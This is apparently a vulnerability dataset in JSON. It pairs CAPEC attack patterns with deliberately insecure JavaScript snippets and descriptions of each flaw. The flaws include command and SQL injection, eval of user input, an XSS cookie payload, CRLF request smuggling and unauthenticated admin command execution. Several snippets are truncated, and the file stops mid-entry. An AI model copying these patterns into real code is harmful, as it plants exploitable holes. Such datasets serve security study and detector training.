[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\nconst fs = require('fs');\n\n// Poorly implemented access control\nconst users = {\n  admin: { role: 'admin'",
        "description": "\"This code demonstrates missing or incorrect authorization controls by allowing unrestricted access to sensitive file operations and administrative functions. The server binds to 0.0.0.0 (all interfaces) and lacks proper ACL checks, permitting unauthorized access to critical resources. File operations are performed without validating user permissions, and administrative endpoints are exposed without authentication checks.\""
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const maxLoginAttempts = 3;\nlet loginAttempts = {};\n\nfunction authenticateUser(username, password) {\n    if (!loginAttempts[username]) {\n        loginAttempts[username] = { count: 0, lockoutTime: null };\n    }\n\n    const userAttempts = loginAttempts[username];\n    const currentTime = Date.now();\n\n    if (userAttempts.lockoutTime && currentTime - userAttempts.lockoutTime < 3600000) {\n        return 'Account locked. Try again later.';\n    }\n\n    if (userAttempts.count >= maxLoginAttempts) {\n        userAttempts.lockoutTime = currentTime;\n        return 'Account locked due to too many failed attempts.';\n    }\n\n    if (password === 'password123') {\n        userAttempts.count = 0;\n        return 'Login successful';\n    } else {\n        userAttempts.count++;\n        return 'Invalid password';\n    }\n}",
        "description": "This code implements a vulnerable authentication system with an overly restrictive account lockout mechanism. It uses a simple counter for login attempts and locks an account after three failed attempts for one hour. The implementation is vulnerable to denial of service attacks as attackers can easily lock out legitimate users by intentionally submitting wrong passwords. Additionally, it uses weak password validation and stores login attempt data in memory without proper cleanup."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "`\nfunction validateAndReadFile(userPath) {\n  // Basic path validation\n  if (userPath.includes('../')) {\n    return 'Invalid path';",
        "description": "\"This code is vulnerable to path traversal through encoding bypass. It validates the path before decoding it, allowing an attacker to use URL-encoded characters to bypass the '../' check. The validation also uses case-insensitive comparison which could be exploited depending on the filesystem. The code demonstrates improper handling of alternate encodings, incorrect validation order, and inadequate path equivalence checking.\""
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "function authenticateRequest(ipAddress) {\n    // Vulnerable IP-based authentication\n    const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n    \n    // No validation of IP format or encoding\n    if (trustedIPs.includes(ipAddress)) {\n        // Vulnerable DNS lookup without verification\n        const dns = require('dns');\n        dns.reverse(ipAddress, (err, hostnames) => {\n            if (hostnames && hostnames.length > 0) {\n                // Grants access based on unverified reverse DNS\n                grantAccess(hostnames[0]);\n            }\n        });\n    }\n\n    function grantAccess(hostname) {\n        // Establish privileged connection without proper endpoint validation\n        const connection = createSecureConnection(hostname);\n        connection.authorize();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to IP address handling and authentication. It relies solely on IP addresses for authentication, accepts IP addresses without proper format validation, performs insecure reverse DNS lookups, and establishes connections without proper endpoint verification. An attacker could bypass authentication using alternate IP address formats or by spoofing DNS responses."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "class TelephonySystem {\n    constructor() {\n        this.adminCommands = new Map();\n        this.isAuthenticated = false;\n    }\n\n    authenticateSignal(signal) {\n        // Vulnerable: No proper validation of signal authenticity\n        if (signal.includes('2600Hz')) {\n            this.isAuthenticated = true;\n            return true;\n        }\n        return false;\n    }\n\n    routeCall(signal, destination) {\n        // Vulnerable: No verification of signal source\n        if (this.authenticateSignal(signal)) {\n            // Vulnerable: No message integrity check\n            return this.executeCommand({\n                type: 'ROUTE',\n                dest: destination,\n                timestamp: Date.now()\n            });\n        }\n    }\n\n    executeCommand(cmd) {\n        // Vulnerable: Replay attacks possible due to simple timestamp check\n        if (this.isAuthenticated) {\n            // Process command without proper authorization checks\n            return `Routing call to ${cmd.dest}`;\n        }\n    }\n}",
        "description": "A vulnerable implementation of a telephony system that demonstrates multiple security flaws including improper authorization, lack of proper signal source verification, and susceptibility to replay attacks. The code mimics legacy phone systems vulnerable to blue boxing attacks by failing to properly validate control signals and implement proper access controls."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "function executeCommand(userInput) {\n    let command = 'ls ' + userInput;\n    const exec = require('child_process').exec;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error}`);\n            return;\n        }\n        console.log(`Output: ${stdout}`);\n    });\n}\n\napp.get('/files', (req, res) => {\n    let path = req.query.path;\n    executeCommand(path);\n    res.send('Command executed');\n});",
        "description": "This code demonstrates a command injection vulnerability by directly incorporating user input into a shell command without proper validation or sanitization. An attacker could inject additional commands using shell metacharacters (e.g., ';&|`') to execute arbitrary commands on the system."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'users'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = ${userId} AND active = 1`;\n  \n  db.query(query, (err, result) => {\n    if (err) {\n      res.status(200).json({ success: false });\n      return;\n    }\n    res.json({ success: result.length > 0 });\n  });\n});",
        "description": "This code demonstrates a vulnerable implementation susceptible to Blind SQL Injection. It accepts user input directly into an SQL query without sanitization and hides error messages, returning only boolean responses. An attacker can exploit this by sending crafted inputs and observing the true/false responses to gradually extract database information, even without error messages. The code violates proper input validation (CWE-20), SQL command sanitization (CWE-89), and implements improper neutralization (CWE-707)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "function processUserData(userData) {\n    let buffer = new Buffer(256);\n    let userInput = userData.toString();\n    \n    // Vulnerable library function that doesn't check bounds\n    function copyToBuffer(input, buf) {\n        for(let i = 0; i < input.length; i++) {\n            buf[i] = input.charCodeAt(i);  // No bounds checking\n        }\n        return buf;\n    }\n    \n    // Using the vulnerable library function\n    let processedData = copyToBuffer(userInput, buffer);\n    \n    // Perform operations without proper validation\n    for(let i = 0; i <= processedData.length; i++) {\n        buffer[i] = processedData[i] + 1;  // Potential out-of-bounds write\n    }\n    \n    return buffer;\n}",
        "description": "This code demonstrates a vulnerable shared library function that fails to implement proper buffer bounds checking. The copyToBuffer function represents a common library component that could be used across multiple applications. It contains multiple vulnerabilities including classic buffer overflow (CWE-120), improper memory bounds checking (CWE-119), and incorrect access of indexable resources (CWE-118). The function blindly copies input data without size validation, allowing potential buffer overflows."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "`\nconst { exec",
        "description": "\"A vulnerable command execution implementation that demonstrates multiple security issues including command injection, buffer overflow, and improper input validation. The code allows arbitrary command execution, performs unsafe buffer operations, and lacks proper bounds checking, making it susceptible to privilege escalation attacks through shell command manipulation.\""
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "`\nfunction processEnvData(envVar) {\n    let buffer = new Buffer(256);\n    let data = process.env[envVar] || '';\n    \n    // Vulnerable: No size checking before copy\n    buffer.write(data, 0);\n    \n    // Vulnerable: Assumes environment variable length is trusted\n    let length = data.length;\n    \n    // Process buffer data without bounds checking\n    for(let i = 0; i <= length; i++) {\n        if(buffer[i] === 0x00) {\n            executeCommand(buffer.slice(0, i).toString());\n            break;",
        "description": "\"This code demonstrates a buffer overflow vulnerability through environment variable manipulation. It creates a fixed-size buffer but fails to validate the input size from environment variables, potentially leading to buffer overflow. It also contains command injection vulnerability by directly executing content from environment variables without proper sanitization.\""
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.get('/download/:filename', (req, res) => {\n    const userFile = req.params.filename;\n    const filePath = path.join(__dirname, 'uploads', userFile);\n    \n    // Vulnerable: No validation of file extension or type\n    if (userFile.endsWith('.txt')) {\n        res.contentType('text/plain');\n    } else if (userFile.endsWith('.html')) {\n        res.contentType('text/html');\n    } else if (userFile.endsWith('.php')) {\n        // Attempts to process PHP files without proper handling\n        require(filePath);\n    }\n    \n    res.sendFile(filePath);\n});",
        "description": "This code demonstrates vulnerable file handling based on file extensions. It blindly trusts user-provided filenames and their extensions to determine content type and processing method, potentially allowing attackers to access unauthorized files or execute malicious code through carefully crafted filenames. The code also attempts to handle PHP files incorrectly in a Node.js environment."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "`\n// Insecure message bus implementation\nclass MessageBus {\n    constructor() {\n        this.subscribers = new Map();\n        this.clientId = Math.random().toString(36);",
        "description": "\"A vulnerable message bus implementation that allows message interception, identity spoofing, and unauthorized access to channels. The code lacks authentication, message integrity checks, and proper security identifier validation, making it susceptible to unauthorized message access and identity impersonation attacks.\""
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "// Load environment configuration\nconst envConfig = process.env;\n\nfunction setupApplication() {\n  const dbConnection = {\n    host: envConfig.DB_HOST,\n    user: envConfig.DB_USER,\n    password: envConfig.DB_PASSWORD,\n    database: envConfig.DB_NAME\n  };\n\n  const userProvidedPath = process.env.USER_FILES_PATH;\n  const logFile = userProvidedPath + '/app.log';\n\n  const command = `mysqldump -h ${dbConnection.host} -u ${dbConnection.user} -p${dbConnection.password} ${dbConnection.database} > ${logFile}`;\n\n  require('child_process').exec(command, (error, stdout, stderr) => {\n    console.log('Database backup completed');\n  });\n}\n\nsetupApplication();",
        "description": "This vulnerable code demonstrates environment variable manipulation risks by directly using unvalidated environment variables in database configuration and file operations. It creates security issues through command injection, path traversal, and exposure of sensitive information. The code executes shell commands using unescaped environment variables and constructs file paths without proper validation, allowing potential attackers to manipulate the application's behavior through environment variable control."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "function processUserData(userData) {\n    let buffer = new Array(10);\n    let input = JSON.parse(userData);\n    \n    // Vulnerable buffer copy without size check\n    for(let i = 0; i < input.length; i++) {\n        buffer[i] = input[i];  // Potential buffer overflow\n    }\n    \n    // Integer overflow vulnerability\n    let size = input.length * 4;\n    let newBuffer = new Array(size);\n    \n    // Vulnerable string processing without bounds checking\n    let command = 'processData(' + buffer.join('') + ')';\n    eval(command);  // Injection vulnerability\n    \n    return buffer;\n}",
        "description": "This vulnerable code demonstrates a buffer overflow attack vector through multiple weaknesses: it copies data without checking buffer sizes, lacks input validation, performs unsafe arithmetic operations that could lead to integer overflow, and includes command injection vulnerabilities. It processes user-supplied data without proper bounds checking or sanitization, allowing potential buffer overflows and code injection."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "function executeCommand(userInput) {\n  // Attempt to filter dangerous characters using a denylist\n  let sanitizedInput = userInput.replace(/[;&|]/g, '');\n  \n  // Vulnerable command construction\n  let command = 'mysql -u admin -p' + sanitizedInput + ' --database userdb';\n  \n  // Execute the command\n  const exec = require('child_process').exec;\n  exec(command, (error, stdout, stderr) => {\n    console.log(stdout);\n  });\n}",
        "description": "This code demonstrates command injection vulnerability due to inadequate input sanitization relying on a denylist approach. The function attempts to filter only specific characters (;, &, |) but leaves other potential command delimiters unhandled. An attacker can bypass this protection using alternative delimiters or special characters not in the denylist to inject malicious commands."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "`\n    const users = {\n      'admin': 'password123',\n      'user': 'welcome',\n      'john': 'abc123'",
        "description": "\"This vulnerable code demonstrates a basic authentication system that is susceptible to dictionary attacks. It uses weak passwords, has no password aging mechanism, no account lockout after multiple failed attempts, and relies on single-factor authentication. The passwords are stored in plaintext and can be easily guessed using common dictionary words.\""
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\nconst path = require('path');\nconst exec = require('child_process').exec;\n\napp.post('/upload', (req, res) => {\n    const fileName = req.body.fileName;\n    const fileContent = req.body.content;\n    \n    fs.writeFileSync(path.join(__dirname, 'uploads', fileName), fileContent);\n    \n    // Execute uploaded file without validation\n    exec(`node ./uploads/${fileName}`, (error, stdout, stderr) => {\n        res.send(stdout);\n    });\n});\n\napp.listen(3000);",
        "description": "Vulnerable code that allows unrestricted file upload and execution. The server accepts any file through a POST request and executes it without proper validation, permission checks, or ownership verification. It demonstrates improper authorization (CWE-285), incorrect permission assignment (CWE-732), and privilege context issues (CWE-270) by allowing arbitrary code execution."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "function displayUserProfile(userData) {\n    const userImage = userData.profileImage || 'default.jpg';\n    const userBio = userData.bio || '';\n    document.getElementById('profile').innerHTML = `\n        <div class='user-info'>\n            <img src='${userImage}' onerror='alert(document.cookie)' />\n            <div class='bio'>${userBio}</div>\n            <!-- ${userData.comments} -->\n        </div>\n    `;\n}",
        "description": "This code demonstrates a vulnerable implementation of user profile display that allows XSS through multiple vectors: unescaped image source attributes, direct innerHTML assignment, and potentially dangerous XML comments. The code accepts user input without proper sanitization and directly embeds it into HTML elements, making it susceptible to script injection through IMG tags and other unexpected elements."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "// Vulnerable widget loader with untrusted source\nfunction loadExternalWidget(widgetUrl) {\n    let script = document.createElement('script');\n    script.src = widgetUrl;\n    script.async = true;\n    document.body.appendChild(script);\n}\n\n// Vulnerable message handler\nwindow.addEventListener('message', function(event) {\n    // No origin check\n    let userData = event.data;\n    // XSS vulnerable output\n    document.getElementById('content').innerHTML = userData.message;\n    // Unsafe script execution\n    eval(userData.script);\n});\n\n// Load widget from untrusted source\nloadExternalWidget('http://untrusted-domain.com/widget.js');",
        "description": "A vulnerable JavaScript implementation that allows loading and execution of untrusted external scripts, combining improper access control, XSS vulnerability, and unsafe script inclusion. The code accepts and executes messages without origin validation, renders unsanitized user input, and loads external widgets without proper security controls."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst weakKey = '1234567890123456';\nconst staticIV = Buffer.from('0000000000000000');\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipheriv('des-cbc', weakKey, staticIV);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction decryptData(encryptedData) {\n  const decipher = crypto.createDecipheriv('des-cbc', weakKey, staticIV);\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\nconst sensitiveData = 'secret password';\nconst encrypted = encryptData(sensitiveData);",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including use of DES (a weak algorithm), a hard-coded encryption key, a static initialization vector (IV), and insufficient key length. The combination makes the encryption susceptible to brute force attacks. The static IV and predictable key greatly reduce the encryption strength and make patterns in the ciphertext more apparent."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "// Authentication system with vulnerable session handling\nconst sessions = new Map();\n\nfunction login(username, password) {\n    // Simple sequential sessionId generation\n    const sessionId = (sessions.size + 1).toString();\n    \n    // Store session without proper validation or expiration\n    sessions.set(sessionId, {\n        username: username,\n        isAdmin: username === 'admin',\n        // Sensitive data stored in session\n        creditCard: '1234-5678-9012-3456'\n    });\n\n    // Set persistent cookie with sensitive data\n    document.cookie = `sessionId=${sessionId}; expires=Thu, 31 Dec 2037 23:59:59 UTC; path=/`;\n    document.cookie = `userRole=${username === 'admin' ? 'admin' : 'user'}; path=/`;\n    \n    return sessionId;\n}\n\nfunction checkAuth(sessionId) {\n    // No validation of session origin or integrity\n    return sessions.has(sessionId);\n}\n\nfunction getUserData(sessionId) {\n    // Blindly trust client-provided sessionId\n    return sessions.get(sessionId);\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including predictable session IDs, persistent storage of sensitive data in cookies, lack of session validation, and client-side security enforcement. The session management system is susceptible to session fixation, spoofing, and authentication bypass attacks."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "`\n        // Server side code\n        const users = new Map();\n        \n        function authenticateUser(clientToken) {\n            // No validation of token structure or signature\n            return users.get(clientToken);",
        "description": "\"This code demonstrates vulnerable client/server authentication where the server implicitly trusts the client token without proper validation. It includes improper authentication, lack of input validation, exposure of sensitive information, and inadequate protection mechanisms. The server accepts and processes client requests without verifying the authenticity of the token or validating input data, making it susceptible to spoofing attacks.\""
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst fileUploadServer = http.createServer((req, res) => {\n    if (req.method === 'POST') {\n        let fileData = '';\n        req.on('data', chunk => {\n            fileData += chunk;\n        });\n        req.on('end', () => {\n            const fileName = req.headers['x-filename'];\n            fs.writeFile(`./uploads/${fileName}`, fileData, (err) => {\n                if (err) console.error(err);\n                if (fileName.endsWith('.js')) {\n                    require(`./uploads/${fileName}`);\n                }\n                res.end('File uploaded successfully');\n            });\n        });\n    }\n});\nfileUploadServer.listen(3000);",
        "description": "This vulnerable code creates a file upload server that accepts any file type without validation, saves it to a local directory, and automatically executes .js files. It demonstrates multiple vulnerabilities including unrestricted file uploads, unsafe file execution based on extension, and lack of input validation, making it susceptible to malicious file uploads and remote code execution."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processUserInput(input) {\n    let buffer = new Array(10);\n    let userDataProcessed = '';\n    \n    // No size check before copying\n    for(let i = 0; i < input.length; i++) {\n        buffer[i] = input[i];\n        userDataProcessed += buffer[i];\n    }\n    \n    // Process the data without validation\n    let command = 'exec ' + userDataProcessed;\n    return eval(command);\n}",
        "description": "This code demonstrates a vulnerable function that processes user input without proper bounds checking or input validation. It uses a fixed-size buffer but doesn't verify the input length, leading to potential buffer overflow. Additionally, it constructs and executes a command using unvalidated user input, making it susceptible to injection attacks."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "`\n// Shared bank account example demonstrating deadlock\nclass BankAccount {\n  constructor(balance) {\n    this.balance = balance;\n    this.lock = false;",
        "description": "\"This code demonstrates a classic deadlock scenario in a banking system where two concurrent transfers between accounts can lead to a deadlock. The deadlock occurs because each transfer operation attempts to acquire locks on both accounts in a different order. If one thread locks account1 and waits for account2, while another thread locks account2 and waits for account1, neither thread can proceed, resulting in a deadlock condition. The code also shows improper synchronization and unsafe locking mechanisms through a simplistic lock implementation.\""
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "`\nlet isAuthenticated = false;\nlet sensitiveFile = 'secret.txt';\n\nasync function checkPermissionAndRead() {\n    // Check if file exists and user has permission\n    if (await fileExists(sensitiveFile)) {\n        // Time gap between check and access\n        isAuthenticated = await checkUserPermissions();\n        \n        if (isAuthenticated) {\n            // During this gap, the file could be replaced with a malicious one\n            return await readFile(sensitiveFile);",
        "description": "\"This code demonstrates a classic TOCTOU (Time of Check to Time of Use) race condition vulnerability. The code checks file permissions and existence before reading it, but there's a time gap between these operations where an attacker could replace the original file with a malicious one. The lack of proper file locking and atomic operations makes this code vulnerable to race condition attacks.\""
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction writeToTempFile(data) {\n  const tempPath = '/tmp/temp_file';\n  \n  // Check if file exists\n  if (!fs.existsSync(tempPath)) {\n    try {\n      // Time gap between check and write (vulnerable to race condition)\n      setTimeout(() => {\n        // Write to file without checking again if it's still a regular file\n        fs.writeFileSync(tempPath, data);\n        \n        // Delayed permission setting\n        fs.chmodSync(tempPath, 0o600);",
        "description": "\"This code demonstrates a vulnerable implementation of temporary file creation that's susceptible to symlink attacks and TOCTOU race conditions. The code checks if a file exists, then waits before writing to it, creating a time window where an attacker could create a symbolic link. The delayed permission setting and lack of proper file handle locking make it vulnerable to race conditions. The code assumes the file path is safe to write to without verifying if it's a symbolic link or if the target path is within the intended directory.\""
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "function processUserInput(input) {\n  // Dangerous command execution without input validation\n  let cmd = 'SELECT * FROM users WHERE id = ' + input;\n  \n  try {\n    // Execute the command directly\n    let result = executeSQL(cmd);\n    return result;\n  } catch(error) {\n    // Revealing sensitive information in error messages\n    console.error('Database error at ' + new Date() + ': ' \n      + error.stack + '\\nConnection string: ' \n      + dbConnection.connectionString);\n    \n    // Incomplete input validation\n    if(input.includes(';')) {\n      return 'Invalid input';\n    }\n  }\n}\n\nfunction executeSQL(cmd) {\n  // Simulated database execution\n  return dbConnection.execute(cmd);\n}",
        "description": "This code is vulnerable to SQL injection and information disclosure through error messages. It lacks proper input validation and sanitization, making it susceptible to fuzzing attacks that could reveal system internals through error messages. The error handling exposes sensitive information about the database connection and stack traces."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "async function processUserFile(filename) {\n  // Check if file exists\n  if (await fileExists(filename)) {\n    // Time delay between check and use\n    await someOtherOperation();\n    \n    // Attempt to read and process the file\n    const data = await fs.readFile(filename);\n    await processData(data);\n    \n    // Delete the file after processing\n    await fs.unlink(filename);\n  }\n}",
        "description": "This code demonstrates a classic TOCTOU race condition where there's a time gap between checking for a file's existence and its subsequent use. An attacker could manipulate the file (delete, replace, or modify it) between the check and use, potentially causing the program to operate on unexpected data or fail in an unsafe way. The vulnerability is made worse by the asynchronous nature of the operations and lack of proper file locking mechanisms."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const childProcess = require('child_process');\nconst fs = require('fs');\n\nfunction unsafeProcessOperation(input) {\n    let privilegedThread = null;\n    \n    try {\n        // Create a privileged process to execute commands\n        privilegedThread = childProcess.spawn('sudo', ['bash']);\n        \n        // Unsafe command construction with user input\n        const command = 'echo \"' + input + '\" > /etc/sensitive_file';\n        \n        // Race condition vulnerability\n        setTimeout(() => {\n            privilegedThread.stdin.write(command + '\\n');\n            privilegedThread.stdin.end();\n        }, 100);\n        \n        // Attempt to access shared memory/resources without proper synchronization\n        global.sharedResource = fs.readFileSync('/etc/sensitive_file');\n        \n    } catch(e) {\n        // Suppress errors to hide attack traces\n    }\n}",
        "description": "This code demonstrates thread hijacking by creating a privileged process, executing untrusted commands with elevated privileges, and accessing shared resources without proper synchronization. It contains OS command injection vulnerabilities, improper privilege management, and race conditions that could be exploited for unauthorized access."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "// Set sensitive user data in cookies without encryption or validation\nfunction setUserCredentials(username, password, role) {\n  document.cookie = `username=${username}; path=/`;\n  document.cookie = `password=${password}; path=/`;\n  document.cookie = `role=${role}; path=/`;\n}\n\n// Client-side authentication check without server validation\nfunction validateUser() {\n  let cookies = document.cookie.split(';');\n  let userRole = cookies.find(c => c.trim().startsWith('role='));\n  \n  if(userRole && userRole.split('=')[1].trim() === 'admin') {\n    return true; // Trust client-side cookie for admin access\n  }\n  return false;\n}\n\n// Process user session without proper validation\nfunction processUserSession(sessionId) {\n  document.cookie = `sessionId=${sessionId}; path=/; expires=Thu, 31 Dec 2099 23:59:59 GMT`;\n  localStorage.setItem('authToken', sessionId);\n  return true; // No session validation or encryption\n}",
        "description": "This vulnerable code demonstrates multiple cookie-related security issues including cleartext storage of sensitive data in cookies, lack of cookie validation, missing encryption, client-side security enforcement, and session handling vulnerabilities. It stores credentials directly in cookies, relies on client-side cookie values for authentication, and implements persistent cookies without proper security measures."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "app.get('/search', function(req, res) {\n  let searchQuery = req.query.q;\n  let html = '<div>Search results for: ' + searchQuery + '</div>';\n  res.send(html);\n})",
        "description": "Vulnerable search endpoint that directly injects user-provided query parameters into HTML output without sanitization, allowing XSS attacks via encoded script tags in the URL query string"
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\napp.use(express.raw({ type: '*/*' }));\n\napp.use('/proxy', async (req, res) => {\n    // Vulnerable header handling - doesn't sanitize CRLF\n    let forwardHeaders = req.headers;\n    forwardHeaders['X-Forwarded-For'] = req.headers['x-forwarded-for'] + '\\r\\n' + \n        'Content-Length: ' + req.body.length + '\\r\\n\\r\\nGET /admin/delete HTTP/1.1';\n\n    // Vulnerable request forwarding without proper validation\n    try {\n        const response = await axios({\n            method: req.method,\n            url: req.query.url || 'http://internal-server',\n            headers: forwardHeaders,\n            data: req.body,\n            maxBodyLength: Infinity,\n            maxContentLength: Infinity\n        });\n        res.send(response.data);\n    } catch(error) {\n        res.status(500).send(error.message);\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates an HTTP proxy server vulnerable to request smuggling, header injection, and SSRF. It forwards requests without properly validating or sanitizing headers, allows arbitrary URL destinations, and doesn't properly handle content-length headers, enabling request smuggling attacks. The code also fails to verify the origin of requests and allows header injection through CRLF sequences."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  let userInput = req.query.input || '';\n  \n  // Vulnerable header handling\n  res.setHeader('X-Custom-Header', userInput);\n  \n  // Vulnerable response construction\n  let responseBody = `{\n    \"data\": \"${userInput}\",\n    \"status\": \"success\"\n  }`;\n  \n  // No validation of CRLF or special characters\n  res.writeHead(200, {\n    'Content-Type': 'application/json',\n    'Content-Length': responseBody.length\n  });\n  \n  res.end(responseBody);\n});",
        "description": "This code demonstrates HTTP response splitting vulnerability by allowing unvalidated user input in response headers and body. The code fails to sanitize CRLF sequences and special characters, enabling an attacker to inject malicious content into HTTP responses. This can lead to response splitting attacks where an attacker can craft responses that might be interpreted differently by downstream components."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const config = require(process.argv[2]);\nconst userConfig = JSON.parse(fs.readFileSync('./user-config.json'));\n\nfunction loadPlugins() {\n    Object.keys(userConfig.plugins).forEach(plugin => {\n        const pluginPath = userConfig.plugins[plugin].path;\n        const pluginCode = fs.readFileSync(pluginPath, 'utf8');\n        eval(pluginCode); // Execute plugin code directly\n    });\n\n    const customTemplate = userConfig.template;\n    const renderer = new Function('data', customTemplate);\n    renderer(config.data);\n}",
        "description": "This code demonstrates vulnerable resource and configuration handling by loading user-controlled plugin files and configuration data without proper validation. It uses eval() to execute plugin code and Function constructor for template rendering, allowing for code injection. The code also unsafely loads files based on user-provided paths without path validation or access control checks."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "// Admin interface with no authentication\nclass AdminAPI {\n    constructor() {\n        this.debug = true;\n    }\n\n    backdoorAccess() {\n        if(this.debug) {\n            return process.env;\n        }\n    }\n\n    executeCommand(cmd) {\n        const exec = require('child_process').exec;\n        return exec(cmd);\n    }\n\n    getAllUsers() {\n        return db.users.find({});\n    }\n}\n\n// Expose API endpoints without authentication\napp.get('/admin/users', (req, res) => {\n    const admin = new AdminAPI();\n    res.json(admin.getAllUsers());\n});\n\napp.post('/admin/execute', (req, res) => {\n    const admin = new AdminAPI();\n    res.json(admin.executeCommand(req.body.command));\n});",
        "description": "This code demonstrates a vulnerable implementation of an admin interface that exposes critical functionality without proper authentication or authorization. It includes undocumented debug features and low-level system command execution capabilities that are publicly accessible. The API endpoints allow unrestricted access to sensitive user data and system commands."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "class UserDataManager {\n  constructor() {\n    this.sensitiveData = {};\n  }\n\n  storeUserCredentials(userId, credentials) {\n    this.sensitiveData[userId] = {\n      username: credentials.username,\n      password: credentials.password,  // Stored in cleartext\n      apiKey: credentials.apiKey,\n      cardNumber: credentials.cardNumber\n    };\n    localStorage.setItem('userCache', JSON.stringify(this.sensitiveData));\n  }\n\n  deleteUser(userId) {\n    // Incomplete data removal - references still exist\n    delete this.sensitiveData[userId];\n    // Original data still remains in localStorage\n  }\n\n  clearCache() {\n    // Improper cleanup - only removes reference, data still in memory\n    this.sensitiveData = null;\n    localStorage.removeItem('userCache');\n  }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to sensitive data exposure and improper data cleanup. It stores sensitive information like passwords and API keys in cleartext both in memory and localStorage, fails to properly remove sensitive data when deleting users, and implements insufficient cache clearing that leaves sensitive data recoverable in memory."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const path = require('path');\nconst config = require('./config.json');\nconst userSuppliedPath = process.env.APP_PATH || './modules';\n\nfunction loadModule(moduleName) {\n    const modulePath = path.join(userSuppliedPath, moduleName);\n    const module = require(modulePath);\n    return module;\n}\n\nconst userModule = loadModule('auth.js');\nuserModule.initialize(config.password);",
        "description": "The code allows external control of module loading paths through an environment variable and loads modules dynamically without validating the path or ensuring the authenticity of loaded resources. It also includes an insecure configuration pattern by potentially exposing sensitive data through config files."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
